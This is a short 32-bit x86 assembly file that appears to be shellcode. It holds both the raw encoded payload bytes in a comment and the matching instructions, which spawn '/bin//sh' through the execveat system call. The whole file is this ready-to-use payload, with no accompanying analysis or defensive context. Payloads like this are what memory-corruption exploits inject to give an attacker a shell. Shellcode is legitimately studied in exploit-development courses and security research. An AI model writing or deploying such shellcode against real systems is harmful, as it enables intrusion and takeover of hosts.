bits 32

section .text

global main 

main:
    ;\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\xBB\x9C\xFF\xFF\xFF\x89\xE1\x31\xD2\x31\xF6\x31\xFF\x66\xB8\x66\x01\xCD\x80

    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, -100 ; AT_FDCWD
    mov ecx, esp ; /bin//sh
    xor edx, edx
    xor esi, esi
    xor edi, edi
    mov ax,0x166 ; execveat
    int 0x80